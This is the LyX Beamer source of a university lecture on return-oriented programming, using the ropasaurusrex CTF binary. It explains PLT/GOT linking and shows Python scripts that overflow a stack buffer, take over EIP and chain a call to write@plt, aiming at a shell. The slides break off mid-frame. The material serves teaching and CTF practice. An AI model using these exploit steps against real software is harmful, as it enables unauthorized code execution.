@@ -1,0 +1,3550 @@
+#LyX 2.1 created this file. For more info see http://www.lyx.org/
+\lyxformat 474
+\begin_document
+\begin_header
+\textclass beamer
+\begin_preamble
+\usepackage{color}
+\usepackage{common/beamerthemelankton-keynote}
+\usepackage{xypic}
+\xyoption{color}
+\usepackage{url}
+\usepackage{xmpincl}
+\includexmp{CC_Attribution-ShareAlike_4.0_International}
+
+\hypersetup{
+        pdftitle                = {ROP},
+        pdfauthor               = {Alessandro Di Federico},
+        pdfsubject              = {},
+        pdfkeywords             = {},
+        pdfproducer             = {},
+        pdfcreator              = {}
+}
+
+\pdfinfo{
+        /Title                  (ROP)
+        /Author                 (Alessandro Di Federico)
+        /Creator                ()
+        /Producer               ()
+        /CreationDate   ()
+        /ModDate                ()
+        /Subject                ()
+        /Keywords               ()
+}
+
+\newcommand{\rosso}{\color{red}}
+\newcommand{\nero}{\color{black}}
+
+\AtBeginSubsection[]{
+  \frame<beamer>{ 
+    \frametitle{Index}   
+    \tableofcontents[currentsection,currentsubsection] 
+  }
+}
+
+\AtBeginSection[]{
+  \frame<beamer>{ 
+    \frametitle{Index}   
+    \tableofcontents[currentsection,currentsubsection] 
+  }
+}
+
+\newenvironment{changemargin}[2]{%
+\begin{list}{}{%
+\setlength{\topsep}{0pt}%
+\setlength{\leftmargin}{#1}%
+\setlength{\rightmargin}{#2}%
+\setlength{\listparindent}{\parindent}%
+\setlength{\itemindent}{\parindent}%
+\setlength{\parsep}{\parskip}%
+}%
+\item[]}{\end{list}}
+\end_preamble
+\use_default_options true
+\maintain_unincluded_children false
+\language english
+\language_package default
+\inputencoding auto
+\fontencoding global
+\font_roman default
+\font_sans default
+\font_typewriter default
+\font_math auto
+\font_default_family default
+\use_non_tex_fonts false
+\font_sc false
+\font_osf false
+\font_sf_scale 100
+\font_tt_scale 100
+\graphics default
+\default_output_format default
+\output_sync 0
+\bibtex_command default
+\index_command default
+\paperfontsize default
+\spacing single
+\use_hyperref true
+\pdf_bookmarks true
+\pdf_bookmarksnumbered false
+\pdf_bookmarksopen false
+\pdf_bookmarksopenlevel 1
+\pdf_breaklinks false
+\pdf_pdfborder true
+\pdf_colorlinks false
+\pdf_backref false
+\pdf_pdfusetitle true
+\papersize default
+\use_geometry true
+\use_package amsmath 1
+\use_package amssymb 1
+\use_package cancel 0
+\use_package esint 1
+\use_package mathdots 1
+\use_package mathtools 0
+\use_package mhchem 1
+\use_package stackrel 0
+\use_package stmaryrd 0
+\use_package undertilde 0
+\cite_engine basic
+\cite_engine_type default
+\biblio_style plain
+\use_bibtopic false
+\use_indices false
+\paperorientation portrait
+\suppress_date false
+\justification true
+\use_refstyle 1
+\index Index
+\shortcut idx
+\color #008000
+\end_index
+\secnumdepth 3
+\tocdepth 3
+\paragraph_separation indent
+\paragraph_indentation default
+\quotes_language english
+\papercolumns 1
+\papersides 1
+\paperpagestyle default
+\tracking_changes false
+\output_changes false
+\html_math_output 0
+\html_css_as_file 0
+\html_be_strict false
+\end_header
+
+\begin_body
+
+\begin_layout Title
+ROP
+\end_layout
+
+\begin_layout Subtitle
+I'm in a hurry and too lazy to find a catchy subtitle
+\end_layout
+
+\begin_layout Institute
+Politecnico di Milano
+\end_layout
+
+\begin_layout Author
+Alessandro Di Federico
+\begin_inset Newline newline
+\end_inset
+
+
+\begin_inset space ~
+\end_inset
+
+
+\begin_inset Newline newline
+\end_inset
+
+
+\begin_inset Graphics
+	filename common/ale-clearmind.svg
+	width 30page%
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Section
+Introduction
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+ropasaurusrex
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\align center
+
+\family typewriter
+\size huge
+https://ctftime.org/task/364
+\end_layout
+
+\begin_layout Itemize
+
+\family typewriter
+9b6c5b013881561e17621785494640d2 libc.so.6
+\end_layout
+
+\begin_layout Itemize
+
+\family typewriter
+c5bb68949dcc3264cd3a560c05d0b566 ropasaurusrex
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Basics
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Enumerate
+The main executable is not relocated
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+You know the runtime address of everything in there
+\end_layout
+
+\begin_layout Pause
+
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+Shared libraries (.so) are relocated
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+You don't know where they are
+\end_layout
+
+\begin_layout Itemize
+However the relative distance is preserved
+\end_layout
+
+\begin_layout Pause
+
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+An ELF is divided in various sections
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Some contain code and can't be written
+\end_layout
+
+\begin_layout Itemize
+Some contain data and can be written
+\end_layout
+
+\begin_layout Itemize
+Data sections will not be executed (stack)
+\end_layout
+
+\end_deeper
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+The goal
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+We want to get a shell
+\end_layout
+
+\begin_layout Itemize
+We need to call an 
+\family typewriter
+execv(
+\begin_inset Quotes eld
+\end_inset
+
+/bin/sh
+\begin_inset Quotes erd
+\end_inset
+
+, ...)
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Why ROP
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+The principle is:
+\end_layout
+
+\begin_layout Standard
+
+\size huge
+Running code that's already there
+\end_layout
+
+\begin_layout Itemize
+We can do this playing with return addresses
+\end_layout
+
+\begin_layout Itemize
+You don't need to load any shellcode
+\end_layout
+
+\begin_layout Itemize
+You just need to control the stack
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Section
+Dynamic loading
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Shell objects
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Shell objects are ELFs loaded dynamically
+\end_layout
+
+\begin_layout Itemize
+They are libraries of various kind
+\end_layout
+
+\begin_layout Itemize
+The C Standard Library is usually a .so file
+\begin_inset Foot
+status open
+
+\begin_layout Plain Layout
+Under Linux usually 
+\family typewriter
+/lib/libc.so.6
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+Use 
+\family typewriter
+ldd
+\family default
+ to list dynamic libs needed by a program
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Where are they loaded?
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+They can be ~everywhere in the address-space
+\end_layout
+
+\begin_layout Itemize
+Fixed positions could cause collisions
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+How can I call a function in a library?
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+The compiler reserves some space for its address
+\end_layout
+
+\begin_layout Itemize
+The dynamic loader gets in at runtime
+\begin_inset Foot
+status open
+
+\begin_layout Plain Layout
+Under Linux x86_64 at 
+\family typewriter
+/lib64/ld-linux-x86-64.so.2
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+It puts the correct addresses there
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+ls actors
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+
+\family typewriter
+\size larger
+r-x
+\family default
+\size default
+ Your code
+\end_layout
+
+\begin_layout Itemize
+
+\family typewriter
+\size larger
+r-x
+\family default
+\size default
+ PLT (Program Linkage Table)
+\end_layout
+
+\begin_layout Itemize
+
+\family typewriter
+\size larger
+rw-
+\family default
+\size default
+ The GOT (Global Offset Table)
+\end_layout
+
+\begin_layout Itemize
+
+\family typewriter
+\size larger
+r-x
+\family default
+\size default
+ The dynamic linker
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+The process
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Your code wants to call 
+\family typewriter
+printf
+\end_layout
+
+\begin_layout Itemize
+It makes a call to a stub function in the PLT
+\end_layout
+
+\begin_layout Itemize
+The stub jumps at an address in the GOT
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+If it's the first call it points to the dynamic linker
+\end_layout
+
+\begin_layout Itemize
+From then on it's the actual address of the 
+\family typewriter
+printf
+\end_layout
+
+\end_deeper
+\end_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\begin_inset CommandInset include
+LatexCommand lstinputlisting
+filename "code/hello.c"
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Example
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ objdump -d hello -M intel-mnemonic 
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+          --no-show-raw-insn 
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+08048448 <main>:
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048448:       push   ebp
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048449:       mov    ebp,esp
+\end_layout
+
+\begin_layout Plain Layout
+
+ 804844b:       and    esp,0xfffffff0
+\end_layout
+
+\begin_layout Plain Layout
+
+ 804844e:       sub    esp,0x10
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048451:       mov    eax,DWORD PTR [ebp+0x8]
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048454:       mov    DWORD PTR [esp+0x4],eax
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048458:       mov    DWORD PTR [esp],0x8048500
+\end_layout
+
+\begin_layout Plain Layout
+
+ 804845f:       call   8048310 <printf@plt>
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048464:       mov    eax,0x0
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048469:       leave
+\end_layout
+
+\begin_layout Plain Layout
+
+ 804846a:       ret
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+main
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ objdump -d hello -M intel-mnemonic 
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+          --no-show-raw-insn 
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+08048310 <printf@plt>:
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048310:       jmp    DWORD PTR ds:0x804a00c
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048316:       push   0x0
+\end_layout
+
+\begin_layout Plain Layout
+
+ 804831b:       jmp    8048300 <_init+0x28>
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+printf@plt
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ gdb hello
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) x /1x 0x804a00c
+\end_layout
+
+\begin_layout Plain Layout
+
+0x804a00c <printf@got.plt>:     0x08048316
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+0x804a00c
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Long story short
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\align center
+
+\family typewriter
+\size huge
+0x804a00c
+\family default
+ will contain the address of 
+\family typewriter
+printf
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Section
+ropasaurusrex
+\end_layout
+
+\begin_layout Subsection
+Playing around
+\end_layout
+
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+inline false
+status open
+
+\begin_layout Plain Layout
+
+ssize_t __cdecl main()
+\end_layout
+
+\begin_layout Plain Layout
+
+{
+\end_layout
+
+\begin_layout Plain Layout
+
+  pwn_me();
+\end_layout
+
+\begin_layout Plain Layout
+
+  return write(1, "WIN
+\backslash
+n", 4u);
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+A look at the executable: main
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+inline false
+status open
+
+\begin_layout Plain Layout
+
+ssize_t __cdecl pwn_me()
+\end_layout
+
+\begin_layout Plain Layout
+
+{
+\end_layout
+
+\begin_layout Plain Layout
+
+  char buf; // [sp+10h] [bp-88h]@1
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+  return read(0, &buf, 0x100u);
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+pwn_me
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Buffer overflow!
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+There's a buffer on the stack of 0x88 bytes
+\end_layout
+
+\begin_layout Itemize
+The read writes there 0x100 bytes from stdin
+\end_layout
+
+\begin_layout Itemize
+We have control of a good piece of the stack
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ ruby pattern_create.rb 512
+\end_layout
+
+\begin_layout Plain Layout
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3...
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Step 1: take over EIP
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Please, use an helper tool otherwise it's tedious
+\end_layout
+
+\begin_layout Itemize
+Metasploit comes handy
+\begin_inset Foot
+status open
+
+\begin_layout Plain Layout
+As long as you don't run the msfconsole you're not a script kiddie
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+pattern_{create,offset}.rb scripts
+\end_layout
+
+\begin_layout Standard
+
+\family typewriter
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ ./ropasaurusrex <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6...
+\end_layout
+
+\begin_layout Plain Layout
+
+Segmentation fault
+\end_layout
+
+\begin_layout Plain Layout
+
+$ dmesg | tail -n1
+\end_layout
+
+\begin_layout Plain Layout
+
+ropasaurusrex[...]: segfault at 37654136 ip 0000000037654136 sp [...] error 14
+\end_layout
+
+\begin_layout Plain Layout
+
+$ ruby pattern_offset.rb 37654136 512
+\end_layout
+
+\begin_layout Plain Layout
+
+140
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Obtain the offset
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+#!/usr/bin/python
+\end_layout
+
+\begin_layout Plain Layout
+
+import sys
+\end_layout
+
+\begin_layout Plain Layout
+
+from helper import *
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit = "A" * 140 + "BBBB"
+\end_layout
+
+\begin_layout Plain Layout
+
+write_string(exploit)
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycodeb{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ python phase1.py | ./ropasaurusrex
+\end_layout
+
+\begin_layout Plain Layout
+
+Segmentation fault
+\end_layout
+
+\begin_layout Plain Layout
+
+$ dmesg | tail -n1
+\end_layout
+
+\begin_layout Plain Layout
+
+ropasaurusrex[...]: segfault at 42424242 ip 0000000042424242 sp [...] error 14
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+First script
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycodeb
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ readelf -l ropasaurusrex
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Where is the ELF?
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+Take a look at the main section:
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Offset in the file: 
+\family typewriter
+0
+\end_layout
+
+\begin_layout Itemize
+Virtual address: 
+\family typewriter
+0x08048000
+\end_layout
+
+\begin_layout Itemize
+Size: 
+\family typewriter
+0x0051c
+\end_layout
+
+\begin_layout Itemize
+Permission: 
+\family typewriter
+\size larger
+r-x
+\end_layout
+
+\end_deeper
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ objdump -d ropasaurusrex -M intel-mnemonic 
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+          --no-show-raw-insn
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+0804830c <write@plt>:
+\end_layout
+
+\begin_layout Plain Layout
+
+ 804830c:       jmp    DWORD PTR ds:0x8049614
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048312:       push   0x8
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048317:       jmp    80482ec
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Where is write?
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Don't know (yet)!
+\end_layout
+
+\begin_layout Itemize
+We can find the stub for the dynamic linker:
+\end_layout
+
+\begin_layout Standard
+\align center
+
+\family typewriter
+\size largest
+write@plt
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+First ROP
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+We can jump in 
+\family typewriter
+write@plt
+\end_layout
+
+\begin_layout Itemize
+Put on the stack:
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+The address of 
+\family typewriter
+write@plt
+\end_layout
+
+\begin_layout Itemize
+The return address after 
+\family typewriter
+write@plt
+\end_layout
+
+\begin_layout Itemize
+Parameters for 
+\family typewriter
+write
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+\align center
+
+\family typewriter
+ssize_t write(int fd, const void *buf, size_t count);
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+#!/usr/bin/python
+\end_layout
+
+\begin_layout Plain Layout
+
+from helper import write_bytes
+\end_layout
+
+\begin_layout Plain Layout
+
+from helper import int2bytes as i2b
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit = ("A" * 140).encode()
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit += i2b(0x0804830c) # Write address
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit += i2b(0xBBBBBBBB) # Return address
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit += i2b(0x00000001) # stdout
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit += i2b(0x08048001) # Address of "ELF"
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit += i2b(0x00000003) # Bytes to write
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+write_bytes(exploit)
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+The script
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ python phase2.py | ./ropasaurusrex
+\end_layout
+
+\begin_layout Plain Layout
+
+ELFSegmentation fault
+\end_layout
+
+\begin_layout Plain Layout
+
+$ dmesg | tail -n1
+\end_layout
+
+\begin_layout Plain Layout
+
+ropasaurusrex[...]: segfault at bbbbbbbb ip 00000000bbbbbbbb sp [...] error 14
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
